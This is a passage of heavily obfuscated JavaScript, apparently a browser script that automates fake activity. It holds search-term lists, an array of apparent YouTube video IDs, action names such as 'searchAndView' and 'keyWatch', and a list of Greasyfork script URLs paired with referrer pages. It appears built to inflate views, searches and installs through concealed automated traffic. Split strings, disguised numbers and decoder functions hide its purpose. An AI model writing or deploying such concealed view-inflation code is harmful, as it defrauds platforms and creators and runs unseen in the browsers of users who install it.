'ndi,mr\x20bea' + 'st\x20podcast' + ',mister\x20be' + 'ast,mrbeas' + 't\x20last\x20to\x20' + 'leave')['split'](',')), searchTerms['push'](('minecraft,' + 'minecraft\x20' + 'hardcore,h' + 'ardcore\x20mi' + 'necraft,mi' + 'necraft\x20ch' + 'allenge,mi' + 'necraft\x20bu' + 't,minecraf' + 't\x20mod,mine' + 'craft\x20mods' + ',minecraft' + '\x20100\x20days,' + 'minecraft\x20' + 'funny,funn' + 'y\x20minecraf' + 't,minecraf' + 't\x20video,mi' + 'necraft\x20sc' + 'hool,100\x20d' + 'ays\x20minecr' + 'aft,minecr' + 'aft\x20animat' + 'ion,w\x20mine' + 'craft,mine' + 'craft\x20comp' + 'ilation,mi' + 'necraft\x20pe' + ',monster\x20s' + 'chool\x20mine' + 'craft,mine' + 'craft\x20mons' + 'ter\x20school' + ',to\x20be\x20con' + 'tinued\x20min' + 'ecraft,min' + 'ecraft\x20izl' + 'e,minecraf' + 't\x20story,mi' + 'necraft\x20mo' + 'vie,minecr' + 'aft\x20house,' + 'minecraft\x20' + 'fakir')['split'](',')), searchTerms['push'](['moomoo.io\x20' + 'zyenith']['repeatExte' + 'nd'](0x21 * 0x33 + -0x1 * 0xd2d + 0x6a4)), searchTerms['push'](['moomoo.io\x20' + 'spyder']['repeatExte' + 'nd'](0x1c5 * -0x15 + -0x1d8f + 0x42c2)), searchTerms['push'](('bts,bts\x20v,' + 'jin\x20bts,bt' + 's\x20news,bts' + '\x20army,v\x20bt' + 's,rm\x20bts,b' + 'ts\x20rm,bts\x20' + 'jin,bts\x20sa' + 'd,sad\x20bts,' + 'bts\x20日本語,bt' + 's\x20韓国語,bts\x20' + '面白い,cctv\x20b' + 'ts,suga\x20bt' + 's,army\x20bts' + ',bts\x20live,' + 'kpop\x20bts,j' + 'imin\x20bts,j' + 'hope\x20bts,b' + 'ts\x20funny,b' + 'ts\x20日本語字幕,b' + 'ts\x20update,' + 'bts\x20future' + ',bts\x20eatin' + 'g,bts\x20stre' + 'ams,bts\x20日本' + '語字幕最新,taeh' + 'yung\x20bts,j' + 'ungkook\x20bt' + 's,bts\x20reac' + 'tion,bts\x20s' + 'truggle,bt' + 's\x20marriage' + ',bts\x20jungk' + 'ook,bts\x20面白' + 'い\x20日本語字幕,bt' + 's\x20playlist' + ',bts\x20play\x20' + 'game,bts\x20n' + 'ew\x20video,b' + 'ts\x20news\x20to' + 'day,bts\x20in' + 'terview')['split'](',')), searchTerms = searchTerms['flat'](0x1b75 + -0x94f + -0x1223);

function d(b, c) {
  const e = a();
  return d = function(f, g) {
    f = f - (0x6 * -0x126 + 0x3a5 + -0x33f * -0x1);
    let h = e[f];
    return h;
  }, d(b, c);
}
const hookPlaylistPoints = [
    'eHpl-BjXo5' + '8',
    '-PgyODlV6V' + '8',
    'S9EkXX0QYD' + 'U',
    'WvcG1OKdHW' + 'o',
    'b6gOcEwtZ8' + 'U',
    'apdtzA0Dzf' + 'k',
    'YiukDwYv2K' + '4',
    'zK-6UH5R5X' + '8',
    'bIXqNjtsEf' + '4',
    W(0xa, '3v%^') + 'Q',
    'u6RVZKcN9z' + 'Q',
    '6ImZdwpdwT' + 'A',
    '0qPB5ANSBK' + 'c',
    '92duH3cqn1' + 'M',
    'b5lKI78fw3' + 's',
    'zpCCPZfP8L' + 'I',
    'ES7oooakr-' + 'c',
    '2eWyJ8FBvQ' + '8',
    'O4-B3OFPDf' + 'Q',
    'JFcnGk0_u7' + 'o',
    'AP7d2Ghq6d' + 'U',
    'UizEAwrZAG' + 'I',
    '0FAi5-h8Hj' + '0',
    'CNqA6IYj17' + 'k',
    'tSiKyCpwnS' + 'Y',
    'OrglyeV5xP' + 'Y',
    'BXkB-g4eCc' + 's',
    'Y53CmmpbOJ' + 's',
    'sm5MLz_IrQ' + 'k',
    'EuciRU_Ska' + '0',
    'cCbDCTLyPc' + 'E',
    'Ox7Ng5T7bm' + 'c',
    'TXTaB-dQg-' + '0',
    '3jSWaWgr_A' + '0',
    'xT8nvuxCRB' + 'E',
    '3c4Ab9EmRg' + 'Y',
    '2kScgeNOpL' + '8',
    't22jhowMom' + 'c',
    'HbcDLgkmXL' + 's',
    'JsKZ41uTeg' + 'c',
    'dfU48FRgs0' + 'g',
    '3K9ILewnUk' + 'o',
    'QmKwnRiKhD' + 'k',
    'n3nVsWsL6I' + 'k',
    'noTs52D_Mw' + 'Y',
    'A0tDR4nTTK' + '0',
    '9eBwFca-B1' + '4',
    'moasU30H5l' + 'A',
    '_Mb8oQtSBW' + 'E',
    'TNGGOgwPtc' + 'M',
    '-pYA-gjkQ8' + 's',
    '5d-dB6tZZA' + 'o',
    '8H2AiOV0oE' + 'o',
    'mI7aiKDGde' + 'w',
    'D-IMDYrj35' + '4',
    'gKgFiEgghy' + 'g',
    'mjVwfjJ2nj' + 'k',
    '6auDBi-D2H' + 'M',
    'X89-SWNdIE' + 'k',
    'T5Pn4LhIwj' + 'M',
    'wVnKGSjY3i' + '8',
    'g11NJftxw1' + '4',
    '9zHirkfEKk' + 'k',
    'ZyGS_AMbIa' + '4',
    'yG6bwB17ZP' + 's',
    'aytHiLe0s6' + 'U',
    'cGe-Mpw_F1' + 'w',
    'eMK7xV_nxZ' + 'o',
    'epJ2MAKa1Y' + 'Q',
    '5BNbKKMUhE' + 'o',
    'oxpAvc6tDP' + '8',
    'jRcc-NIR2R' + 'I',
    '258btO4mFw' + '4',
    'pXjJAUvSbQ' + 'A',
    '63-irfPjh2' + 'c',
    'xbrDZAFf3Q' + 's',
    'MVHMtRlesU' + 'g',
    'zed05qfHMB' + 'I',
    'nkhkxKUHsY' + 'g',
    'n4cSAqR9H1' + 'Q',
    'gOUPndcj7z' + 'I',
    'n3HBTTDHoX' + '8',
    'XIgMFHPIXv' + '4',
    'oQHKMky-_K' + 'c',
    'zfDgTzZ2nh' + '0',
    '1PYettRo-D' + 'M',
    'jzuZuwF490' + '4',
    '2DAgWTlXae' + '8',
    'keouUYA5hI' + 'k',
    'F7i7wRlGCd' + 'c',
    'uToD2c0CdJ' + 'c',
    'Y8DzpdFZZ8' + '8',
    '-rrH657DAa' + 'o',
    'QTrEEWtDks' + '4',
    'TWTSnQDuad' + 'Y',
    'a0GUyvgnzg' + 'c',
    'eSReWZQyKd' + 'E',
    'D_5pMqdKSs' + '4',
    'm0ie8gHS00' + 'I',
    '6WosqMq9ej' + 'o',
    'i0afAOlon_' + '4',
    'j_fe6PfxW4' + 'Y',
    'GfPzi8SYr0' + 'w',
    'MSgZhNCwff' + 'M',
    'wxyBC_z6bI' + '8',
    'PkQpV-Fwhs' + 'k',
    'bVD6cWOVhN' + 'U',
    'mjZOpQlHbx' + 'M',
    'k_BXkcdbBO' + 'M',
    'X72oUsFV7q' + '0',
    'lONsILfq-W' + 'Y',
    'Bhe9PyM_s_' + 'Q',
    'Bhe9PyM_s_' + 'Q',
    'h4TBnDkX4y' + 'o',
    'PNBJyHEkfk' + '4',
    'L3iHS__ufc' + 'g',
    'm7aliUAwm_' + 'Y',
    'FuPVf85zMi' + 'w',
    'gtupAeNTDS' + 'M',
    'yyJ8zkckoB' + '8',
    'ZDTESiN1eS' + 'w',
    'Fo6x16DkoR' + 'o',
    'IAJqRxhVqO' + 'k',
    'KAgwII8TGj' + 'o',
    'o4tLCshmlb' + 'M',
    'dLj5fIupdA' + 'o',
    '_Xl_-b9P4U' + 'Q',
    'V3NxxpUUfW' + 'E',
    'J3ygeDEMnO' + 'w',
    'HcP_xmdwsl' + 'c',
    'M9g0h7px2_' + 'M',
    'b5WfUvcSgr' + 'U',
    'JGHnIshsoC' + 'E',
    'x2gfhCLHd9' + '4',
    'M5Fr8G0ma9' + 'o',
    '3sGeIBfFlC' + 'M',
    'k74y4KOJ2m' + '4',
    'pTHJB0S8E-' + 'U',
    'KaIrXJLfYP' + 'M',
    '0cisZkywhg' + 'Q',
    '0dVzItbl9E' + 'w',
    't0EqnhcSb1' + 's',
    'MuiXtvo1RY' + 'E',
    'Nj-3KC6knH' + 'w',
    'B19HbETNi5' + '8',
    'yKN_QkroH6' + 's',
    'U9ExFM1pji' + '0',
    'sONzDfjKhL' + '4',
    'n3Kj8zEfew' + 'U',
    'nXLGQ7QeoG' + 'Y',
    'OQFQiwiM-P' + 'Y',
    'UtPRpKRTtH' + 'U',
    'E56Myp0BzE' + 'E',
    '7DjOp_JM2Z' + 'w',
    'rNFLQFz_G1' + 'g',
    '1r2pKoVAdj' + 'M',
    'gm3eiv6UND' + 'M',
    'yOiROfjxzX' + 'o',
    'lt2AcxC_ap' + 'g',
    'bObEme2BDO' + 'E',
    '6Ut6HbJmW4' + 'w',
    'fUs0TtQQTo' + '0',
    '_phHS3FAgW' + 'Q',
    '1f8sU4l3dP' + '4',
    'HwTSLUd53K' + '8',
    'EpP2ymD_QG' + 'A',
    'TQ69QFqmbo' + 'I',
    'wA8BqUka_u' + '0',
    'bc8Ey-vuR5' + 'M',
    'PZ_uLi7ULl' + '0',
    'smu5FsnhwF' + '4',
    'dv1JluwoOb' + 'c',
    'nHotP0jbcv' + 'A',
    'iIjYNEmrVv' + 'M',
    'SeP-OZAiPb' + 'c',
    'v52PClvMFt' + 'k',
    '3loLqIPxTS' + '0',
    'jVu9mOzbSq' + 'U',
    '73SAN1vOrV' + 'k',
    'YLPxp4ntym' + 's',
    'YWXfelRk3b' + 'Q',
    'CsxlLMb6Uj' + 'o',
    'uafGOfwzpa' + 'Q',
    'XIr8qotHOI' + 'E',
    'EcoPCWC3Uh' + 'o',
    'AhOwyT8aIh' + 'g',
    't-Ox7lI5UH' + 's',
    'i08qNmssXe' + 'Q',
    'QrJIU09eD-' + 'g',
    'QvNNCQ-8Rp' + 'E',
    'k5gjnjDFAZ' + 's',
    'h_NQ3y1ek8' + 'U',
    'evPsJlNLy_' + '4',
    'qEPTydgwh4' + 's',
    'LB685ckhuf' + 'E',
    'Lj1EcSMGey' + '0',
    'OE19r7MIMW' + 'Q',
    'u8E3p0Vy-P' + 'Y',
    'f4a5OPFQa7' + 'k',
    'XDo7Q7yUEt' + 'k',
    'Vw_9zw0qHI' + 'c',
    'KGT5nbDsI_' + '8',
    'E008Eql59M' + 'Q',
    'wSOFdefX47' + 'A',
    W(0xe, 'U1ab') + 'E',
    'hgfvmcBkc0' + '4',
    '0wP7csnX7k' + '4',
    'Xo0R8WiRSb' + '4',
    '8zNp8EOpGd' + '4',
    'sWYhIJZmoS' + 'E',
    'YdG8U1W-bX' + '0',
    'QeDsoSNml-' + 'c',
    'xW5q77El0x' + '8',
    'ZF14issJFE' + 'Y',
    'TRglEGLLKX' + 'o',
    'UE0SXc5k1e' + 'g',
    '6VY65D8f3D' + 'Q',
    'Iwxuob4fA8' + 'Q',
    'M4elJHCUIi' + 's',
    'GY9WWhO504' + 'k',
    'eErUSxmLDw' + '8',
    'ITQfAfzLj3' + 'I',
    'vbDrCL2FuL' + 'g',
    'KyQ_sUgtbK' + 'U',
    'lbEJcipUp8' + 'I',
    '2SqCn2LreN' + 'g',
    '1i-G2TUn41' + '0',
    's0ru6uK7vi' + '8',
    'gOxiE5UAAD' + 'w',
    'lx1rOOjekc' + '8',
    '5VYN2zA-Si' + 'k',
    'q9rLWEAzoo' + 'k',
    X(0x4) + 'g',
    'fMqRu_ON-D' + 'E',
    'GfvShU6Sy9' + 'A',
    'OHzOmi1b60' + 'Y',
    'D9oTUKT-_n' + 'A',
    '_BrT2PlUiw' + '0',
    'kuuI4LzKgm' + 'I',
    '78dymyg88r' + 'M',
    'mi0nGt2B-q' + 'o',
    'HaI7BjnwnO' + 'c',
    'xlAEOkIuy7' + 'Y',
    '3VmtckvTXl' + 'U',
    'ed7TWHKDr4' + 'E',
    '2LfTjyVtbf' + 'U',
    'STHlCkloyv' + 'E',
    '-BI_-6YnM6' + 'Y',
    'LSK_G1qCQw' + 'M',
    '4tzqIl6EKV' + 'k',
    '9DshU55EiV' + '8',
    'mBtaEI_6e8' + 's',
    '960lvuduwY' + 'w',
    'XWJH-6J5Ee' + 'g',
    'XLS4qmyCAX' + 'g',
    '8cJDYeRiLn' + 'k',
    'cCaIVrltHz' + 'w',
    '8X2fF4pgM0' + 'E',
    '6s8Xm4wylr' + '4',
    'eFceshvavn' + 'o',
    '2h4g7euqR-' + 'U',
    'ujiBqXnn92' + '8',
    'w9F2NST-9j' + 's',
    'w-oc7F5Mmy' + 'U',
    'UYrmqL3cOD' + 'U',
    '4QB59etj0I' + 'o',
    'MY9MTNgXcN' + 'o',
    'ISBmcKDS5C' + '8',
    'ogIb7A7tvW' + '0',
    '-L583IZF6s' + 'k',
    'NbeKQq29ZL' + '0',
    'SPplDxd74F' + 's',
    'MHGV8QmpAz' + 'k',
    'iWzezFWpU7' + 'A',
    'NNCQt1rXXE' + 'Y',
    'bcb_ZhJJK8' + 'g',
    '3KoZGQiY6N' + 'o',
    'aSaXQH8F1_' + 'A',
    'V5nMOhI62o' + 'w',
    'JvlPjRUdId' + '0',
    '2gQHuClLCb' + '0',
    '5e-qDy-uUJ' + 'E',
    'oE8vC0QEWU' + 'E',
    '7cQken99yu' + 'o',
    'pmzu080j7r' + 'I',
    'sVy9F4whP6' + 'o',
    'MJrkylk7iE' + 'c',
    'XYjsTxi6oE' + '8',
    'mKlMouB6tp' + '0',
    'o2yunZQley' + 'A',
    'oRryU9F9Lv' + 's',
    'uzzK-052H0' + 'c',
    'VSvA4rCe-4' + 'M',
    'XURH2u_0fM' + 'I',
    'yfpVL2g_tk' + 'o',
    'AuEEjQ8x9o' + 'w',
    'wWkviY8zBr' + 'c',
    'zt_eubHWhx' + 'c',
    'O_7_BGU3u_' + '0',
    'QFDKBxmOn3' + 'Y',
    'w6gccNWXXv' + 'g',
    'VdNJxbrqdX' + 's',
    'wbi5Dxebvn' + 'I',
    'XEFOREYrJg' + 'k',
    'I2rcRta7WJ' + '0',
    'OP5KGfXHX_' + 'A',
    'w2MUMbbwlm' + 'o',
    'X3bF0nd6kf' + 'w',
    'WDDAhASf9j' + 'w',
    'fRwcV8gjbc' + 'w',
    '7T63gaRThr' + '0',
    'zC8AWIwhbf' + 's',
    'JSkVE0n-ee' + 'o',
    'qiQA5pWWRt' + 'U',
    'QdXCjZtfXu' + 'c',
    'vlBji8TOax' + 'o',
    'pBx_5CbIcp' + 'o',
    'L1Oy5F6ZMO' + 'Q',
    'P0NjLaBed-' + 'E',
    'DR16C4-keB' + '0',
    'LGmpIpu9eD' + 'w',
    'rNkX_A4kBA' + 'Q',
    'QztVMjrEk4' + '0',
    'uOM6m6KL5d' + '4',
    'g-Aju8xrrO' + 'E',
    'DfkDbFk_x9' + '8',
    V(0x13) + 'I',
    'ALSZnqQTuJ' + 'o',
    'xUmB6BpZBE' + 'w',
    'SxNOcZ1s85' + '8',
    '-noeCjO416' + 'k',
    'taPJqXBI8V' + 'Y',
    'YxqbkMi1Is' + '4',
    'vnJTyve2r-' + '4',
    '44lRVYQ38E' + 'Q',
    'QOv1N1X5J-' + 'g',
    'jNjREs7ODT' + 'g',
    'U30ToJo3dd' + 'k',
    'rm7lNIIOQC' + 'Y',
    'mGU6sOPlYv' + 'c',
    '6pwxUXdt6T' + 'Q',
    '6MkJRee35a' + 'Q',
    'LVbf7U9WAI' + 'c',
    'gPbhFvEeJ3' + 'M',
    'LWXAxz0MiH' + 'A',
    'L0KQJqfwJJ' + 'Y',
    'GWr33_u0VK' + 'c',
    '4ud3ZPfWkH' + 's',
    'dxSrySC4XM' + 'c',
    'iIM2KZC69W' + '0',
    '8DuJ3BAwME' + 'o',
    'm3BAhe1wsl' + 'Y',
    '02U_3pAZxM' + '8',
    '0e7nidPa97' + 'g',
    'TixW__6Eer' + 'o',
    'q46W8MTRTC' + 'E',
    'Jdxp04Je1O' + 'w',
    'HfP4TO3gfN' + '0',
    '4dUJaeB0qL' + '8',
    'xnL-fRJ3RZ' + 'o',
    'yJbD0Df45u' + 'Q',
    '-pGw8RkSSB' + 'k',
    '7cy86Njsis' + 'M',
    'jbgqvxtauo' + '4',
    'N8M00JjSVI' + 'I',
    'MfR5q6Td3R' + 'c',
    'eHwcx94wcp' + 's',
    'olDgVFgAgP' + 'o',
    'eAAd5BmzXz' + 'M',
    'xgTjQ2sGXd' + '4',
    'ipny6JUbzw' + 's',
    'WOwQ0UxbRj' + '4',
    'h0PKFed2GB' + 's',
    'JxdOrgzq7Z' + '8',
    '-VgpSWWW-8' + 'w',
    '-ix4OizkAn' + 's',
    'd3CRE9y3YV' + 's',
    '4QZlfXxorJ' + 'o',
    'YlDpg8aCs5' + 'M',
    'Qe5WT22-AO' + '8',
    'b_rjBWmc1i' + 'Q',
    '9yjZpBq1XB' + 'E',
    'hPx-RiBKXt' + 'Q',
    'UMqLDhl8PX' + 'w',
    'DlJEt2KU33' + 'I',
    'BWeqoARup-' + 'Q',
    '2Dx76lD8Sc' + 'c',
    'j_nI6G3ZDi' + 'E',
    'zvcUYYN1sx' + 'w',
    'cWRkYo1S3L' + '4',
    'cWRkYo1S3L' + '4',
    'bxC_PN3SRv' + 'I',
    '94m93T_5JL' + 'M',
    'RBSHAH4iWU' + '8',
    'RBSHAH4iWU' + '8',
    'RBSHAH4iWU' + '8',
    'bo9fTeXvSi' + 'A',
    'z6LqXiAK-8' + '0',
    '5tbOspjJ5f' + '0',
    'twQ6kKjtBk' + 'Y',
    'Ig17K38Fy0' + 'Y',
    'ZdlrVDwn_a' + '4',
    'aCT4Lddunx' + 'g',
    'acAvMGQtln' + 'M',
    '8XkcbdSRdO' + '0',
    '0e3GPea1Ty' + 'g',
    'zxYjTTXc-J' + '8',
    '9bqk6ZUsKy' + 'A',
    'plSyrHqUh7' + '8',
    'HkvQywg_uZ' + 'A',
    'lADBHDg-Jt' + 'A',
    'I2O7blSSzp' + 'I',
    'kd2KEHvK-q' + '8',
    'CbUjuwhQPK' + 's',
    'fb7T1v_VHp' + 'E',
    'SpeSpA3e56' + 'A',
    'RQdxHi4_Pv' + 'c',
    'nx2-4l4s4N' + 'w',
    'tUTCq3iiw_' + '4',
    'VDa5iGiPgG' + 's',
    'S-sJp1FfG7' + 'Q',
    'Hm1YFszJWb' + 'Q'
  ],
  GlobalActions = [
    searchAndView,
    anchorAndView,
    frontScreenActions,
    keyWatch
  ],
  wait = f => new Promise(h => setTimeout(h, f)),
  scriptTargets = [{
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/457024' + '-surviv-io' + '-xclient-b' + 'eta',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/surviv.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/404065' + '-%E7%BD%91' + '%E9%A1%B5%' + 'E7%B2%BE%E' + '7%81%B5',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/51cto.co' + 'm'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + X(0x6) + 'pts/22545-' + 'anti-bd-re' + 'direct',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/by-' + 'site/baidu' + '.com?page=' + '4'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/385' + '044-zhihu-' + 'anonymous-' + 'users',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/by-' + 'site/zhihu' + '.com'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/302' + '36-zhihu-l' + 'ink-fix',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/by-' + V(0x8) + '.com'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/435948' + '-btb',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/baidu.co' + 'm'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/430335' + '-wb-script',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/zhihu.co' + 'm'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/430572' + '-beautify-' + 'the-baidu-' + 'homepage',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/zhihu.co' + 'm'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/410781' + '-diep-io-a' + 'nti-afk-ti' + 'meout',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/diep.io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + V(0x0) + 'iew-youtub' + 'e-tags',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/21012-' + 'youtubeext',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/20798-' + 'youtube-hi' + 'de-volume-' + 'control',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/9090-y' + 'outube-add' + '-video-id-' + 'text-field',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/20710-' + 'calm-down-' + 'youtube',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/39544-' + 'youtube-po' + 'lymer-disa' + 'ble',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/412698' + '-youtube-a' + 'uto-skip-a' + 'ds',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/413965' + '-youtube-l' + 'ike-dislik' + 'e-video-an' + 'd-skip-ad-' + 'keyboard-s' + 'hortcuts-f' + 'ork-from-n' + 'erevar009',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/39919-' + 'youtube-su' + 'ggested-vi' + 'deo-hider-' + 'for-youtub' + 'e-classic',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/414756' + '-requestho' + 'ok',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/414876' + '-live-chat' + '-mod-calib' + 'er',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/40462-' + 'youtube-no' + '-resume',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/40517-' + 'youtube-re' + 'sume',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/415706' + '-moomoo-io' + '-remove-co' + 'okie-prefe' + 'rences-tab',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/405955' + '-web-secur' + 'ity',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/381682' + '-html5%E8%' + 'A7%86%E9%A' + '2%91%E6%92' + '%AD%E6%94%' + 'BE%E5%99%A' + '8%E5%A2%9E' + '%E5%BC%BA%' + 'E8%84%9A%E' + '6%9C%AC',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/429635' + '-always-on' + '-focus',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/30310-' + 'removeads',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/455853' + '-%E7%BD%91' + '%E9%A1%B5%' + 'E8%AE%BF%E' + '9%97%AE%E5' + '%8A%A0%E9%' + '80%9F%E5%9' + '9%A8',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/454941' + '-hcaptcha-' + 'captcha-so' + 'lver-by-no' + 'captchaai',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/374794' + '-lift-web-' + 'restrictio' + 'ns-io-game' + '-mods-moom' + 'oo-io-krun' + 'ker-io-ad-' + 'link-bypas' + 'ser-adbloc' + 'k-more',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/baidu.co' + 'm'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/374794' + '-lift-web-' + 'restrictio' + 'ns-io-game' + '-mods-moom' + 'oo-io-krun' + 'ker-io-ad-' + 'link-bypas' + 'ser-adbloc' + 'k-more',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/374794' + '-lift-web-' + 'restrictio' + 'ns-io-game' + '-mods-moom' + 'oo-io-krun' + 'ker-io-ad-' + 'link-bypas' + 'ser-adbloc' + 'k-more',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/discord.' + 'com'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/407994' + '-mope-io-a' + 'uto-dive-a' + 'uto-boost-' + 'see-people' + '-underwate' + 'r-see-invi' + 'sible-play' + 'ers-remove' + '-ads',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/mope.io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/424066' + '-pancake-m' + 'od-katana-' + 'musket-aut' + 'oheal-anti' + '-insta-sta' + 'rter-resou' + 'rces-and-m' + 'ore',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/429746' + '-best-moom' + 'oo-io-hack' + '-mod-2022-' + '2023',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/405943' + '-moomoo-io' + '-agar-io-s' + 'urviv-io-s' + 'lither-io-' + X(0x11) + 'obal-name-' + 'manager-kr' + 'unker-comi' + 'ng-soon',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/456855' + '-anti-anti' + '-adblock-v' + '1-all-site' + 's',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/454134' + '-moomoo-io' + V(0xc) + 'autoheal-a' + 'utobreak-f' + 'ast-and-mo' + 're',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + V(0x3) + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/424447' + '-xtaming-c' + 'lient-tami' + 'ng-io-hack' + 's',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/taming.i' + 'o'
    },
    {
